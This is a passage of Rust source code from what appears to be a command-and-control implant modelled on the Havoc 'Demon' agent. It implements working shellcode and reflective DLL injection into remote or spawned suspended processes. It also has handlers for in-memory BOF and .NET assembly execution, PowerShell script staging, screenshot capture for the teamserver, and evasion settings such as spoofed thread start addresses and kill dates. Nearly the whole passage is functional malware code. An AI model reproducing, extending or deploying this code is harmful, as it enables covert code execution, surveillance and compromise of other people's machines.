        match DemonInjectWay::try_from(way) {
            Ok(DemonInjectWay::Inject) => {
                let pid = match target_pid {
                    Some(p) if p != 0 => p,
                    _ => return DemonInjectError::InvalidParam,
                };
                inject_into_process(pid, shellcode)
            }
            Ok(DemonInjectWay::Spawn) => spawn_and_inject(shellcode),
            Ok(DemonInjectWay::Execute) => inject_into_self(shellcode),
            Err(_) => {
                warn!(way, "InjectShellcode: unknown injection way");
                DemonInjectError::InvalidParam
            }
        }
    }

    /// Inject shellcode into an existing process by PID.
    fn inject_into_process(pid: u32, shellcode: &[u8]) -> DemonInjectError {
        unsafe {
            let access = PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION;
            let handle = OpenProcess(access, FALSE, pid);
            if handle == 0 || handle == INVALID_HANDLE_VALUE as isize {
                warn!(pid, "InjectShellcode: OpenProcess failed");
                return DemonInjectError::Failed;
            }

            let result = write_and_execute(handle, shellcode);

            CloseHandle(handle);
            result
        }
    }

    /// Spawn a new suspended process, inject shellcode, and resume.
    fn spawn_and_inject(shellcode: &[u8]) -> DemonInjectError {
        unsafe {
            let mut si: STARTUPINFOW = core::mem::zeroed();
            si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

            // Spawn notepad.exe as default target (same as Demon's Spawn64 default).
            let spawn_path: Vec<u16> =
                "C:\\Windows\\System32\\notepad.exe\0".encode_utf16().collect();

            let ok = CreateProcessW(
                spawn_path.as_ptr(),
                core::ptr::null_mut(),
                core::ptr::null(),
                core::ptr::null(),
                FALSE,
                CREATE_NO_WINDOW | CREATE_SUSPENDED,
                core::ptr::null(),
                core::ptr::null(),
                &si,
                &mut pi,
            );

            if ok == 0 {
                warn!("InjectShellcode: CreateProcessW failed");
                return DemonInjectError::Failed;
            }

            info!(pid = pi.dwProcessId, "InjectShellcode: spawned suspended process");

            let result = write_and_execute(pi.hProcess, shellcode);

            if result != DemonInjectError::Success {
                TerminateProcess(pi.hProcess, 1);
            }

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            result
        }
    }

    /// Inject shellcode into the current process.
    fn inject_into_self(shellcode: &[u8]) -> DemonInjectError {
        unsafe {
            let handle = windows_sys::Win32::System::Threading::GetCurrentProcess();
            write_and_execute(handle, shellcode)
        }
    }

    /// Allocate RW memory, write shellcode, flip to RX, and create a remote thread.
    unsafe fn write_and_execute(process: isize, shellcode: &[u8]) -> DemonInjectError {
        let base = VirtualAllocEx(
            process,
            core::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if base.is_null() {
            warn!("InjectShellcode: VirtualAllocEx failed");
            return DemonInjectError::Failed;
        }

        let mut written = 0usize;
        let ok = WriteProcessMemory(
            process,
            base,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut written,
        );
        if ok == 0 || written != shellcode.len() {
            warn!("InjectShellcode: WriteProcessMemory failed");
            return DemonInjectError::Failed;
        }

        let mut old_protect = 0u32;
        let ok =
            VirtualProtectEx(process, base, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect);
        if ok == 0 {
            warn!("InjectShellcode: VirtualProtectEx failed");
            return DemonInjectError::Failed;
        }

        let thread = CreateRemoteThread(
            process,
            core::ptr::null(),
            0,
            Some(core::mem::transmute(base)),
            core::ptr::null(),
            0,
            core::ptr::null_mut(),
        );
        if thread == 0 || thread == INVALID_HANDLE_VALUE as isize {
            warn!("InjectShellcode: CreateRemoteThread failed");
            return DemonInjectError::Failed;
        }

        CloseHandle(thread);
        DemonInjectError::Success
    }

    /// Reflectively inject a DLL into a target process.
    pub fn inject_dll(
        _technique: u32,
        pid: u32,
        loader: &[u8],
        dll: &[u8],
        params: &[u8],
    ) -> DemonInjectError {
        if pid == 0 {
            return DemonInjectError::InvalidParam;
        }

        unsafe {
            let access = PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION;
            let handle = OpenProcess(access, FALSE, pid);
            if handle == 0 || handle == INVALID_HANDLE_VALUE as isize {
                warn!(pid, "InjectDll: OpenProcess failed");
                return DemonInjectError::Failed;
            }

            let result = reflective_inject(handle, loader, dll, params);

            CloseHandle(handle);
            result
        }
    }

    /// Spawn a new process and reflectively inject a DLL.
    pub fn spawn_dll(loader: &[u8], dll: &[u8], args: &[u8]) -> DemonInjectError {
        unsafe {
            let mut si: STARTUPINFOW = core::mem::zeroed();
            si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

            let spawn_path: Vec<u16> =
                "C:\\Windows\\System32\\notepad.exe\0".encode_utf16().collect();

            let ok = CreateProcessW(
                spawn_path.as_ptr(),
                core::ptr::null_mut(),
                core::ptr::null(),
                core::ptr::null(),
                FALSE,
                CREATE_NO_WINDOW | CREATE_SUSPENDED,
                core::ptr::null(),
                core::ptr::null(),
                &si,
                &mut pi,
            );

            if ok == 0 {
                warn!("SpawnDll: CreateProcessW failed");
                return DemonInjectError::Failed;
            }

            info!(pid = pi.dwProcessId, "SpawnDll: spawned suspended process");

            let result = reflective_inject(pi.hProcess, loader, dll, args);

            if result == DemonInjectError::Success {
                ResumeThread(pi.hThread);
            } else {
                TerminateProcess(pi.hProcess, 1);
            }

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            result
        }
    }

    /// Write loader + DLL + params into a remote process and create a thread at
    /// the loader entry.
    unsafe fn reflective_inject(
        process: isize,
        loader: &[u8],
        dll: &[u8],
        params: &[u8],
    ) -> DemonInjectError {
        let total_size = loader.len() + dll.len();
        let base = VirtualAllocEx(
            process,
            core::ptr::null(),
            total_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if base.is_null() {
            warn!("ReflectiveInject: VirtualAllocEx for DLL failed");
            return DemonInjectError::Failed;
        }

        // Write loader at base
        let mut written = 0usize;
        let ok =
            WriteProcessMemory(process, base, loader.as_ptr().cast(), loader.len(), &mut written);
        if ok == 0 {
            warn!("ReflectiveInject: WriteProcessMemory (loader) failed");
            return DemonInjectError::Failed;
        }

        // Write DLL immediately after loader
        let dll_base = (base as usize + loader.len()) as *const core::ffi::c_void;
        let ok =
            WriteProcessMemory(process, dll_base, dll.as_ptr().cast(), dll.len(), &mut written);
        if ok == 0 {
            warn!("ReflectiveInject: WriteProcessMemory (DLL) failed");
            return DemonInjectError::Failed;
        }

        // Write params if present
        let param_addr = if !params.is_empty() {
            let param_base = VirtualAllocEx(
                process,
                core::ptr::null(),
                params.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if param_base.is_null() {
                warn!("ReflectiveInject: VirtualAllocEx (params) failed");
                return DemonInjectError::Failed;
            }
            let ok = WriteProcessMemory(
                process,
                param_base,
                params.as_ptr().cast(),
                params.len(),
                &mut written,
            );
            if ok == 0 {
                warn!("ReflectiveInject: WriteProcessMemory (params) failed");
                return DemonInjectError::Failed;
            }
            param_base
        } else {
            core::ptr::null()
        };

        // Flip DLL region to RX
        let mut old_protect = 0u32;
        let ok = VirtualProtectEx(process, base, total_size, PAGE_EXECUTE_READ, &mut old_protect);
        if ok == 0 {
            warn!("ReflectiveInject: VirtualProtectEx failed");
            return DemonInjectError::Failed;
        }

        // Create remote thread at loader entry, passing params as argument
        let thread = CreateRemoteThread(
            process,
            core::ptr::null(),
            0,
            Some(core::mem::transmute(base)),
            param_addr,
            0,
            core::ptr::null_mut(),
        );
        if thread == 0 || thread == INVALID_HANDLE_VALUE as isize {
            warn!("ReflectiveInject: CreateRemoteThread failed");
            return DemonInjectError::Failed;
        }

        CloseHandle(thread);
        DemonInjectError::Success
    }
}

#[cfg(not(windows))]
mod inject_native {
    use red_cell_common::demon::DemonInjectError;
    use tracing::info;

    /// Shellcode injection is not supported on non-Windows platforms.
    pub fn inject_shellcode(
        _way: u32,
        _method: u32,
        _x64: u32,
        _shellcode: &[u8],
        _target_pid: Option<u32>,
    ) -> DemonInjectError {
        info!("InjectShellcode: not supported on this platform");
        DemonInjectError::Failed
    }

    /// DLL injection is not supported on non-Windows platforms.
    pub fn inject_dll(
        _technique: u32,
        _pid: u32,
        _loader: &[u8],
        _dll: &[u8],
        _params: &[u8],
    ) -> DemonInjectError {
        info!("InjectDll: not supported on this platform");
        DemonInjectError::Failed
    }

    /// DLL spawn injection is not supported on non-Windows platforms.
    pub fn spawn_dll(_loader: &[u8], _dll: &[u8], _args: &[u8]) -> DemonInjectError {
        info!("SpawnDll: not supported on this platform");
        DemonInjectError::Failed
    }
}

/// Delegate to the platform-native shellcode injection implementation.
fn inject_shellcode_native(
    way: u32,
    method: u32,
    x64: u32,
    shellcode: &[u8],
    target_pid: Option<u32>,
) -> DemonInjectError {
    inject_native::inject_shellcode(way, method, x64, shellcode, target_pid)
}

/// Delegate to the platform-native reflective DLL injection implementation.
fn inject_dll_native(
    technique: u32,
    pid: u32,
    loader: &[u8],
    dll: &[u8],
    params: &[u8],
) -> DemonInjectError {
    inject_native::inject_dll(technique, pid, loader, dll, params)
}

/// Delegate to the platform-native spawn + DLL injection implementation.
fn spawn_dll_native(loader: &[u8], dll: &[u8], args: &[u8]) -> DemonInjectError {
    inject_native::spawn_dll(loader, dll, args)
}

// ─── COMMAND_CONFIG (2500) ───────────────────────────────────────────────────

/// Handle a `CommandConfig` task: update a runtime configuration value and echo
/// the new setting back to the teamserver.
///
/// Incoming payload (LE): `[config_key: u32][key-specific value(s)…]`
/// Outgoing payload (LE): `[config_key: u32][key-specific echo value(s)…]`
fn handle_config(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;

    let key_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse config key: {e}");
            return DispatchResult::Ignore;
        }
    };

    let key = match DemonConfigKey::try_from(key_raw) {
        Ok(k) => k,
        Err(_) => {
            warn!(key = key_raw, "CommandConfig: unknown config key — ignoring");
            return DispatchResult::Ignore;
        }
    };

    let rest = &payload[offset..];
    match key {
        DemonConfigKey::ImplantVerbose => handle_config_u32_bool(key_raw, rest, config, |c, v| {
            c.verbose = v != 0;
        }),
        DemonConfigKey::ImplantSleepTechnique => {
            handle_config_u32(key_raw, rest, config, |c, v| c.sleep_technique = v)
        }
        DemonConfigKey::ImplantCoffeeThreaded => {
            handle_config_u32_bool(key_raw, rest, config, |c, v| c.coffee_threaded = v != 0)
        }
        DemonConfigKey::ImplantCoffeeVeh => {
            handle_config_u32_bool(key_raw, rest, config, |c, v| c.coffee_veh = v != 0)
        }
        DemonConfigKey::MemoryAlloc => {
            handle_config_u32(key_raw, rest, config, |c, v| c.memory_alloc = v)
        }
        DemonConfigKey::MemoryExecute => {
            handle_config_u32(key_raw, rest, config, |c, v| c.memory_execute = v)
        }
        DemonConfigKey::InjectTechnique => {
            handle_config_u32(key_raw, rest, config, |c, v| c.inject_technique = v)
        }
        DemonConfigKey::ImplantSpfThreadStart => {
            handle_config_addr(key_raw, rest, config, |c, lib, func, off| {
                c.spf_thread_addr = Some((lib, func, off));
            })
        }
        DemonConfigKey::InjectSpoofAddr => {
            handle_config_addr(key_raw, rest, config, |c, lib, func, off| {
                c.inject_spoof_addr = Some((lib, func, off));
            })
        }
        DemonConfigKey::InjectSpawn64 => {
            handle_config_spawn(key_raw, rest, config, |c, path| c.spawn64 = Some(path))
        }
        DemonConfigKey::InjectSpawn32 => {
            handle_config_spawn(key_raw, rest, config, |c, path| c.spawn32 = Some(path))
        }
        DemonConfigKey::KillDate => handle_config_killdate(key_raw, rest, config),
        DemonConfigKey::WorkingHours => {
            handle_config_u32(key_raw, rest, config, |c, v| c.working_hours = Some(v as i32))
        }
    }
}

/// Config sub-handler for simple `u32` values: read value, apply setter, echo back.
fn handle_config_u32(
    key_raw: u32,
    rest: &[u8],
    config: &mut SpecterConfig,
    setter: impl FnOnce(&mut SpecterConfig, u32),
) -> DispatchResult {
    let mut offset = 0;
    let value = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse u32 value: {e}");
            return DispatchResult::Ignore;
        }
    };
    setter(config, value);

    let mut out = Vec::with_capacity(8);
    write_u32_le(&mut out, key_raw);
    write_u32_le(&mut out, value);
    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
}

/// Config sub-handler for boolean-as-u32 values (same wire format as `handle_config_u32`).
fn handle_config_u32_bool(
    key_raw: u32,
    rest: &[u8],
    config: &mut SpecterConfig,
    setter: impl FnOnce(&mut SpecterConfig, u32),
) -> DispatchResult {
    handle_config_u32(key_raw, rest, config, setter)
}

/// Config sub-handler for address triplets: `[library: string][function: string][offset: u32]`.
///
/// Echoes back `[config_key][library: string][function: string]`.
fn handle_config_addr(
    key_raw: u32,
    rest: &[u8],
    config: &mut SpecterConfig,
    setter: impl FnOnce(&mut SpecterConfig, String, String, u32),
) -> DispatchResult {
    let mut offset = 0;
    let lib_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse addr library: {e}");
            return DispatchResult::Ignore;
        }
    };
    let func_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse addr function: {e}");
            return DispatchResult::Ignore;
        }
    };
    let off = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse addr offset: {e}");
            return DispatchResult::Ignore;
        }
    };

    let library = String::from_utf8_lossy(&lib_bytes).trim_end_matches('\0').to_string();
    let function = String::from_utf8_lossy(&func_bytes).trim_end_matches('\0').to_string();

    info!(library = %library, function = %function, offset = off, "config addr updated");
    setter(config, library.clone(), function.clone(), off);

    // Echo back: [key][library string][function string]
    let mut out = Vec::new();
    write_u32_le(&mut out, key_raw);
    write_string_le(&mut out, &library);
    write_string_le(&mut out, &function);
    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
}

/// Config sub-handler for spawn process paths (UTF-16LE encoded from the server).
///
/// Echoes back `[config_key][path: utf16le]`.
fn handle_config_spawn(
    key_raw: u32,
    rest: &[u8],
    config: &mut SpecterConfig,
    setter: impl FnOnce(&mut SpecterConfig, String),
) -> DispatchResult {
    let mut offset = 0;
    let raw_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse spawn path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let path = decode_utf16le_null(&raw_bytes);
    info!(path = %path, "config spawn path updated");
    setter(config, path.clone());

    // Echo back: [key][path as utf16le]
    let mut out = Vec::new();
    write_u32_le(&mut out, key_raw);
    write_utf16le(&mut out, &path);
    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
}

/// Config sub-handler for kill date (`i64` Unix timestamp).
///
/// Echoes back `[config_key][timestamp: u64]`.
fn handle_config_killdate(key_raw: u32, rest: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;
    let raw = match parse_u64_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse kill date: {e}");
            return DispatchResult::Ignore;
        }
    };

    config.kill_date = if raw == 0 { None } else { Some(raw as i64) };
    info!(kill_date = ?config.kill_date, "config kill date updated");

    let mut out = Vec::with_capacity(12);
    write_u32_le(&mut out, key_raw);
    write_ptr_le(&mut out, raw);
    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
}

/// Append a NUL-terminated UTF-8 string as `[u32 LE length][bytes + NUL]`.
fn write_string_le(buf: &mut Vec<u8>, s: &str) {
    let mut data = Vec::with_capacity(s.len() + 1);
    data.extend_from_slice(s.as_bytes());
    data.push(0);
    write_bytes_le(buf, &data);
}

// ─── COMMAND_SCREENSHOT (2510) ──────────────────────────────────────────────

/// Handle a `CommandScreenshot` task: capture the screen and return BMP bytes.
///
/// The screenshot command takes no arguments from the server.
///
/// Outgoing payload (LE): `[success: u32][image_len: u32][image_bytes…]`
///
/// On success, `success = 1` and `image_bytes` contains a 24-bit BMP file.
/// On failure (unsupported platform or GDI error), `success = 0`.
fn handle_screenshot() -> DispatchResult {
    let bmp = crate::platform::capture_screenshot();
    let mut out = Vec::new();
    match bmp {
        Some(data) if !data.is_empty() => {
            write_u32_le(&mut out, 1); // success
            write_bytes_le(&mut out, &data);
        }
        _ => {
            write_u32_le(&mut out, 0); // failure
        }
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandScreenshot, out))
}

// ─── COMMAND_INLINE_EXECUTE (20) ────────────────────────────────────────────

/// Handle a `CommandInlineExecute` task: load and execute a BOF (COFF object file).
///
/// Incoming payload (LE): `[function_name: string][bof_file_id: u32][params_file_id: u32][flags: i32]`
///
/// `flags`:
///   - 0 → non-threaded execution
///   - 1 → threaded execution
///   - 2 → use agent config default (`coffee_threaded`)
///
/// The handler retrieves the BOF object and parameter data from the in-memory
/// file store, then delegates to the [`coffeeldr`] module for COFF loading and
/// execution.  Results are returned as one or more callbacks with the
/// `CommandInlineExecute` command ID.
fn handle_inline_execute(
    payload: &[u8],
    config: &SpecterConfig,
    mem_files: &mut MemFileStore,
) -> DispatchResult {
    let mut offset = 0;

    // Parse function name (length-prefixed UTF-8 string)
    let func_name_bytes = match parse_bytes_le(payload, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("InlineExecute: failed to parse function name: {e}");
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
    };
    let function_name =
        String::from_utf8_lossy(&func_name_bytes).trim_end_matches('\0').to_string();

    let bof_file_id = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InlineExecute: failed to parse bof_file_id: {e}");
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
    };

    let params_file_id = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InlineExecute: failed to parse params_file_id: {e}");
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
    };

    let flags = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v as i32,
        Err(e) => {
            warn!("InlineExecute: failed to parse flags: {e}");
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
    };

    // Retrieve BOF object data from MemFileStore
    let bof_data = match mem_files.get(&bof_file_id) {
        Some(mf) if mf.is_complete() => mf.data.clone(),
        Some(_) => {
            warn!(bof_file_id, "InlineExecute: BOF memfile not complete");
            mem_files.remove(&bof_file_id);
            mem_files.remove(&params_file_id);
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
        None => {
            warn!(bof_file_id, "InlineExecute: BOF memfile not found");
            mem_files.remove(&params_file_id);
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
    };

    // Retrieve argument data from MemFileStore (may be empty)
    let arg_data = match mem_files.get(&params_file_id) {
        Some(mf) if mf.is_complete() => mf.data.clone(),
        Some(_) => {
            warn!(params_file_id, "InlineExecute: params memfile not complete");
            mem_files.remove(&bof_file_id);
            mem_files.remove(&params_file_id);
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
        None => Vec::new(), // No params is valid
    };

    // Determine threading mode
    let threaded = match flags {
        0 => false,
        1 => true,
        _ => config.coffee_threaded, // use config default
    };

    info!(
        function = %function_name,
        bof_size = bof_data.len(),
        arg_size = arg_data.len(),
        threaded,
        "InlineExecute: executing BOF"
    );

    // Execute the BOF
    let result = coffeeldr::coffee_execute(&function_name, &bof_data, &arg_data, threaded);

    // Clean up memfiles
    mem_files.remove(&bof_file_id);
    mem_files.remove(&params_file_id);

    // Convert BOF callbacks to dispatch responses
    let responses: Vec<Response> = result
        .callbacks
        .into_iter()
        .map(|cb| {
            let mut out = Vec::new();
            write_u32_le(&mut out, cb.callback_type);
            out.extend_from_slice(&cb.payload);
            Response::new(DemonCommand::CommandInlineExecute, out)
        })
        .collect();

    if responses.len() == 1 {
        DispatchResult::Respond(responses.into_iter().next().unwrap_or_else(|| {
            let mut out = Vec::new();
            write_u32_le(&mut out, coffeeldr::BOF_COULD_NOT_RUN);
            Response::new(DemonCommand::CommandInlineExecute, out)
        }))
    } else {
        DispatchResult::MultiRespond(responses)
    }
}

/// Build an inline-execute error response with the given BOF callback type.
fn inline_execute_error(callback_type: u32) -> DispatchResult {
    let mut out = Vec::new();
    write_u32_le(&mut out, callback_type);
    DispatchResult::Respond(Response::new(DemonCommand::CommandInlineExecute, out))
}

// ─── COMMAND_JOB (21) ──────────────────────────────────────────────────────

/// Handle a `CommandJob` task: list, suspend, resume, or kill background jobs.
///
/// Incoming payload (LE): `[subcommand: u32][optional job_id: u32]`
///
/// Outgoing payload (LE):
///   - **List**: `[1: u32][repeated: job_id: u32, type: u32, state: u32]`
///   - **Suspend/Resume/Kill**: `[subcmd: u32][job_id: u32][success: u32]`
fn handle_job(payload: &[u8], job_store: &mut JobStore) -> DispatchResult {
    let mut offset = 0;

    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandJob: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonJobCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandJob: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandJob dispatch");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match subcmd {
        DemonJobCommand::List => {
            for job in job_store.list() {
                write_u32_le(&mut out, job.job_id);
                write_u32_le(&mut out, job.job_type);
                write_u32_le(&mut out, job.state);
            }
        }
        DemonJobCommand::Suspend => {
            let job_id = match parse_u32_le(payload, &mut offset) {
                Ok(v) => v,
                Err(e) => {
                    warn!("CommandJob/Suspend: failed to parse job_id: {e}");
                    return DispatchResult::Ignore;
                }
            };
            let success = job_store.suspend(job_id);
            write_u32_le(&mut out, job_id);
            write_u32_le(&mut out, u32::from(success));
        }
        DemonJobCommand::Resume => {
            let job_id = match parse_u32_le(payload, &mut offset) {
                Ok(v) => v,
                Err(e) => {
                    warn!("CommandJob/Resume: failed to parse job_id: {e}");
                    return DispatchResult::Ignore;
                }
            };
            let success = job_store.resume(job_id);
            write_u32_le(&mut out, job_id);
            write_u32_le(&mut out, u32::from(success));
        }
        DemonJobCommand::KillRemove => {
            let job_id = match parse_u32_le(payload, &mut offset) {
                Ok(v) => v,
                Err(e) => {
                    warn!("CommandJob/Kill: failed to parse job_id: {e}");
                    return DispatchResult::Ignore;
                }
            };
            let success = job_store.kill(job_id);
            write_u32_le(&mut out, job_id);
            write_u32_le(&mut out, u32::from(success));
        }
        DemonJobCommand::Died => {
            // Internal callback — the agent detects a tracked process has died
            // and reports it.  Currently a no-op for Specter.
            info!("CommandJob/Died: internal callback (no-op)");
            return DispatchResult::Ignore;
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandJob, out))
}

// ─── COMMAND_PS_IMPORT (0x1011) ────────────────────────────────────────────

/// Handle a `CommandPsImport` task: store a PowerShell script in memory.
///
/// Incoming payload (LE): `[script_mem_file_id: u32]`
///
/// The script bytes are retrieved from the in-memory file store (uploaded via
/// `CommandMemFile`).  If no memfile ID is present in the payload, the raw
/// payload bytes are used directly (backwards-compatible path).
///
/// Response callback: `[output: string]` — empty string on success, error
/// message on failure.
fn handle_ps_import(
    payload: &[u8],
    ps_scripts: &mut PsScriptStore,
    mem_files: &mut MemFileStore,
) -> DispatchResult {
    let mut offset = 0;

    // Try to parse a memfile ID first; fall back to raw bytes
    let script_data = if let Ok(mem_file_id) = parse_u32_le(payload, &mut offset) {
        match mem_files.remove(&mem_file_id) {
            Some(mf) if mf.is_complete() => mf.data,
            Some(_) => {
                warn!(mem_file_id, "PsImport: memfile not complete");
                return ps_import_response("PowerShell import failed: incomplete transfer");
            }
            None => {
                // No memfile with this ID — treat remaining payload as script bytes
                if payload.len() > 4 {
                    payload[4..].to_vec()
                } else {
                    return ps_import_response("PowerShell import failed: no script data");
                }
            }
        }
    } else {
        // No u32 parseable — use entire payload as script data
        payload.to_vec()
    };

    if script_data.is_empty() {
        return ps_import_response("PowerShell import failed: empty script");
    }

    info!(size = script_data.len(), "PsImport: script stored");
    *ps_scripts = script_data;

    // Empty string = success
    ps_import_response("")
}

/// Build a `CommandPsImport` callback response.
///
/// Payload (LE): `[output: bytes (UTF-8 string)]` — empty string means success.
fn ps_import_response(message: &str) -> DispatchResult {
    let mut out = Vec::new();
    write_bytes_le(&mut out, message.as_bytes());
    DispatchResult::Respond(Response::new(DemonCommand::CommandPsImport, out))
}

// ─── COMMAND_ASSEMBLY_INLINE_EXECUTE (0x2001) ──────────────────────────────

/// Handle a `CommandAssemblyInlineExecute` task: run a .NET assembly in-process.
///
/// Incoming payload (LE):
///   `[pipe_name: wstring][app_domain: wstring][net_version: wstring]`
///   `[assembly_mem_file_id: u32][assembly_args: wstring]`
///
/// The assembly PE bytes are retrieved from the in-memory file store.
fn handle_assembly_inline_execute(payload: &[u8], mem_files: &mut MemFileStore) -> DispatchResult {
    let mut offset = 0;

    // Parse pipe name (UTF-16LE wstring)
    let pipe_bytes = match parse_bytes_le(payload, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("AssemblyInlineExecute: failed to parse pipe_name: {e}");
            return assembly_error();
        }
    };
    let pipe_name = decode_utf16le_null(&pipe_bytes);

    // Parse AppDomain name
    let domain_bytes = match parse_bytes_le(payload, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("AssemblyInlineExecute: failed to parse app_domain: {e}");
            return assembly_error();
        }
    };
    let app_domain = decode_utf16le_null(&domain_bytes);

    // Parse .NET version
    let version_bytes = match parse_bytes_le(payload, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("AssemblyInlineExecute: failed to parse net_version: {e}");
            return assembly_error();
        }
    };
    let net_version = decode_utf16le_null(&version_bytes);

    // Parse assembly memfile ID
    let mem_file_id = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("AssemblyInlineExecute: failed to parse mem_file_id: {e}");
            return assembly_error();
        }
    };

    // Parse assembly arguments
    let args_bytes = parse_bytes_le(payload, &mut offset).unwrap_or_default();
    let assembly_args = decode_utf16le_null(&args_bytes);

    // Retrieve assembly data from MemFileStore
    let assembly_data = match mem_files.remove(&mem_file_id) {
        Some(mf) if mf.is_complete() => mf.data,
        Some(_) => {
            warn!(mem_file_id, "AssemblyInlineExecute: memfile not complete");
            return assembly_error();
        }
        None => {
            warn!(mem_file_id, "AssemblyInlineExecute: memfile not found");
            return assembly_error();
        }
    };

    info!(
        pipe = %pipe_name,
        domain = %app_domain,
        version = %net_version,
        assembly_size = assembly_data.len(),
        args = %assembly_args,
        "AssemblyInlineExecute: executing .NET assembly"
    );

    // Execute the assembly
    let result = dotnet::dotnet_execute(
        &pipe_name,
        &app_domain,
        &net_version,
        &assembly_data,
        &assembly_args,
    );

    // Convert callbacks to dispatch responses
    let mut responses: Vec<Response> = result
        .callbacks
        .into_iter()
        .map(|cb| {
            let mut out = Vec::new();
            write_u32_le(&mut out, cb.info_id);
            out.extend_from_slice(&cb.payload);
            Response::new(DemonCommand::CommandAssemblyInlineExecute, out)
        })
        .collect();

    // If there's captured output, send it as a standard output callback
    if !result.output.is_empty() {
        let mut out = Vec::new();
        write_u32_le(&mut out, 0x00); // CALLBACK_OUTPUT
        write_bytes_le(&mut out, &result.output);
        responses.push(Response::new(DemonCommand::CommandOutput, out));
    }

    if responses.len() == 1 {
        DispatchResult::Respond(
            responses.into_iter().next().unwrap_or_else(assembly_error_response),
        )
    } else {
        DispatchResult::MultiRespond(responses)
    }
}

/// Build a `CommandAssemblyInlineExecute` FAILED response.
fn assembly_error() -> DispatchResult {
    DispatchResult::Respond(assembly_error_response())
}

/// Build a single DOTNET_INFO_FAILED response.
fn assembly_error_response() -> Response {
    let mut out = Vec::new();
    write_u32_le(&mut out, dotnet::DOTNET_INFO_FAILED);
    Response::new(DemonCommand::CommandAssemblyInlineExecute, out)
}

// ─── COMMAND_ASSEMBLY_LIST_VERSIONS (0x2003) ───────────────────────────────

/// Handle a `CommandAssemblyListVersions` task: enumerate installed CLR versions.
///
/// No incoming data.
///
/// Outgoing payload (LE): repeated `[version: wstring (UTF-16LE)]` entries.
fn handle_assembly_list_versions() -> DispatchResult {
    let versions = dotnet::enumerate_clr_versions();

    info!(count = versions.len(), "AssemblyListVersions: found CLR versions");

    let mut out = Vec::new();
    for version in &versions {
        write_utf16le(&mut out, version);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandAssemblyListVersions, out))
}

// ─── COMMAND_PACKAGE_DROPPED (2570) ─────────────────────────────────────────

/// Handle `CommandPackageDropped` (ID 2570): a previously queued packet was
/// dropped (e.g. exceeded the SMB pipe buffer limit).
///
/// Incoming payload (LE): `[dropped_package_length: u32][max_length: u32]`
///
/// The handler cleans up any in-flight state associated with the request:
/// downloads whose `request_id` matches are marked for removal, and any
/// partially-staged mem-files with the same ID are discarded.  No response
/// packet is generated — this mirrors the original Havoc behaviour where
/// `RequestCompleted` is deliberately *not* called so the teamserver can
/// still receive subsequent dropped-package notifications for the same
/// request.
fn handle_package_dropped(
    payload: &[u8],
    request_id: u32,
    downloads: &mut DownloadTracker,
    mem_files: &mut MemFileStore,
) -> DispatchResult {
    let mut offset = 0;

    let dropped_length = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
